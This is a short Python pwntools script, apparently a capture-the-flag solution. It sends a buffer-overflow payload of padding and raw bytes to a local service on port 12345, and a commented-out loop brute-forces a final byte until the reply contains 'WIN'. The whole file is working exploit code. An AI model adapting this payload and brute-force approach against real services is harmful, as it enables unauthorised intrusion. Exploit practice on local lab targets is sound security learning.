from pwn import *

payload = 'paperAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x28\xad\x28\x7c\x70\xc1\x91'+'AAAAAA'

i = 0
'''
while (i<=0xff):
    p = remote('127.0.0.1', 12345)
    print p.recv()
    p.send(payload+chr(i))
    print i
    a = p.recvall()
    print a
    if 'WIN' in a:
        i+=1
    p.close()
'''

p = remote('127.0.0.1', 12345)
print p.recv()
p.send(payload)
print p.recvall()
